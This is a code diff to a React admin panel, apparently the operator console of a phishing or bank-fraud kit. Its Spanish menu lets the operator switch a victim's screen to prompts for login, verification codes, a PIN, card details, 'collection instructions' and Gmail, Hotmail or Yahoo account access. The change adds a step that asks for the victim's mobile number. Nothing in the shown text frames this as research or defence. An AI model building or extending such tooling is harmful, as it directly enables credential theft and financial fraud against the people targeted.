@@ -964,19 +964,20 @@ export default function AdminPanel() {
                 >
                   <option value="">Selecciona una opción</option>
                   <option value="login">1. Login</option>
-                  <option value="vuelos_otorgados">2. Vuelos Otorgados</option>
-                  <option value="codigo">3. Código de verificación</option>
-                  <option value="nip">4. NIP</option>
-                  <option value="protege">5. Aviso de seguridad</option>
-                  <option value="tarjeta">6. Instrucciones recolección</option>
-                  <option value="cancelacion">7. Cancelación exitosa</option>
-                  <option value="mensaje">8. Ingresa el mensaje que gustes</option>
-                  <option value="sms_compra">9. SMS Compra - Cancelación de cargo</option>
-                  <option value="gmail">10. Solicitar acceso Gmail</option>
-                  <option value="gmail_verify">11. Verificación Google</option>
-                  <option value="hotmail">12. Solicitar acceso Hotmail</option>
-                  <option value="yahoo">13. Solicitar acceso Yahoo</option>
-                  <option value="datos_tarjeta">14. Ingreso de datos de tarjeta</option>
+                  <option value="telefono">2. Ingresa tu teléfono celular</option>
+                  <option value="vuelos_otorgados">3. Vuelos Otorgados</option>
+                  <option value="codigo">4. Código de verificación</option>
+                  <option value="nip">5. NIP</option>
+                  <option value="protege">6. Aviso de seguridad</option>
+                  <option value="tarjeta">7. Instrucciones recolección</option>
+                  <option value="cancelacion">8. Cancelación exitosa</option>
+                  <option value="mensaje">9. Ingresa el mensaje que gustes</option>
+                  <option value="sms_compra">10. SMS Compra - Cancelación de cargo</option>
+                  <option value="gmail">11. Solicitar acceso Gmail</option>
+                  <option value="gmail_verify">12. Verificación Google</option>
+                  <option value="hotmail">13. Solicitar acceso Hotmail</option>
+                  <option value="yahoo">14. Solicitar acceso Yahoo</option>
+                  <option value="datos_tarjeta">15. Ingreso de datos de tarjeta</option>
                 </select>
               </div>
             </div>
